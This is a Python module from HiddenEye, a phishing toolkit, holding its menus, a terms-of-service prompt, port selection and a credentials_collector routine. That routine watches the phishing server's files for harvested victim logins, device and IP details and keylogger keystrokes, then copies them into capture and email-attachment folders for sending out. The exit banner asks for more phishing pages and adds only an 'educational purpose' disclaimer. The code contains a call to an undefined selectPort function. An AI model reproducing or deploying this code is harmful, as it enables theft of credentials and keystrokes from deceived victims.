from Defs.ImportManager.unsorted_will_be_replaced import run_command, wait, chmod, stat, pathlib_Path, copyfile
import Defs.ThemeManager.theme as theme
import Defs.FeatureManager.EmailManager.email_prompt as email_prompt
import Defs.ActionManager.Server.server_menu as server_menu


default_palette = theme.default_palette

def exit_message(port):  # Message when HiddenEye exit
    choice = input(
        "\n\n{0}[{1}?{0}] Re-run(r) : Exit(x) : Send Email(M) : SelectServer(S)\n\n >> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
    if choice == 'R' or choice == 'r':
        run_command('sudo python3 HiddenEye.py')
    elif choice == 'M' or choice == 'm':
        email_prompt.captured_data_email_confirmation(port)
    elif choice == 'S' or choice == 's':
    	server_menu.server_selection(port)
    elif choice == 'X' or choice == 'x':
        run_command('clear')
        print('''
                  {1}HIDDEN EYE {1}BY: DARKSEC TEAM
            {0}https://dark-sec-official.com
  {1}  [[*]] IF YOU LIKE THIS TOOL, THEN PLEASE HELP TO BECOME BETTER.
  {0}
     [{1}!{0}] PLEASE LET US KNOW , IF ANY PHISHING PAGE GOT BROKEN .
     [{1}!{0}] MAKE PULL REQUEST, LET US KNOW YOU SUPPORT US.
     [{1}!{0}] IF YOU HAVE MORE PHISHING PAGES, THEN JUST MAKE A PULL REQUEST.
     [{1}!{0}] PLEASE DON'T HARM ANYONE , ITS ONLY FOR EDUCATIONAL PURPOSE.
     [{1}!{0}] WE WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL

  {1}  [[*]] THANKS FOR USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n '''.format(default_palette[2], default_palette[0]))
    else:
        run_command('clear')
        return exit_message(port)

def terms_of_service_message():  # menu where user select what they wanna use
    # Terms Of Service
    wait(6)
    run_command('clear')
    orange  = '\033[33m'
    blue  = '\033[34m'
    purple  = '\033[35m'
    red  = '\033[31m'
    print("\n\n\n              {1}WITH GREAT {0}POWER {2}- {1}COMES GREAT {0}RESPONSIBILITY      ".format(red, purple, blue))
    
    if input("\n\n\n\n{2}[{1}!{2}]{3} Do you agree to use this tool for educational/testing purposes only? {1}({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(default_palette[2], default_palette[4], default_palette[0], orange)).upper() != 'Y':
        run_command('clear')
        print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(default_palette[0], default_palette[4]))
        exit()

def module_loading_message(module):  # This one just show text..
    print('''\n {0}[{1}*{0}] SELECT ANY ONE MODE...{0}\n--------------------------------'''.format(default_palette[0], default_palette[2]))


def credentials_collector(port):

    print("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n{2}________________________________________________________________________________\n".format(default_palette[0], default_palette[2], default_palette[4]))
    while True:
        with open('Server/www/usernames.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer('\n {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}'.format(default_palette[2], default_palette[3], lines))
                #run_command("touch Server/CapturedData/usernames.txt 
                pathlib_Path("Server/CapturedData/usernames.txt").touch(mode=0o777, exist_ok=True)
                
                # && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt 
                captured_usernames = open('Server/CapturedData/usernames.txt', 'a')
                new_usernames = open('Server/www/usernames.txt')
                captured_usernames.write(new_usernames.read())
                new_usernames.close()
                captured_usernames.close()
                # && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt 
                copyfile('Server/CapturedData/usernames.txt', 'Defs/FeatureManager/EmailManager/attachments/usernames.txt')

                # && echo -n '' > Server/www/usernames.txt")
                new_usernames = open('Server/www/usernames.txt', 'w')
                new_usernames.write('')
                new_usernames.close()

        with open('Server/www/ip.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer('\n {0}[{1} DEVICE DETAILS FOUND {0}]{1}:\n {0}{2}{1}'.format(default_palette[2], default_palette[3], lines))
                run_command('touch Server/CapturedData/ip.txt && cat Server/www/ip.txt >> Server/CapturedData/ip.txt && cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')

        creds.close()

        with open('Server/www/KeyloggerData.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer('{0}...............................'.format(default_palette[0]))
                log_writer(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}'.format(default_palette[3], default_palette[2], lines))
                run_command('touch Server/CapturedData/KeyloggerData.txt && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                log_writer('{0}...............................'.format(default_palette[0]))

        creds.close()

def log_writer(ctx):  # Writing log
    logFile = open("log.txt", "w")
    logFile.write(ctx.replace(default_palette[0], "").replace(default_palette[1], "").replace(default_palette[2], "").replace(default_palette[3], "").replace(default_palette[4], "") + "\n")
    print(ctx)

def port_selector():  # Question where user must select port
    run_command('clear')
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------'''.format(default_palette[0], default_palette[2]))
    print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(default_palette[0], default_palette[4]))
    choice = input(" \n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
    try:
        if (int(choice) > 65535 or int(choice) < 1):
            return selectPort()
        else:
            return choice
    except:
        return port_selector()

def remove_readonly(func, path, _):
    "Clear the readonly bit and reattempt the removal"
    chmod(path, stat.S_IWRITE)
    func(path)
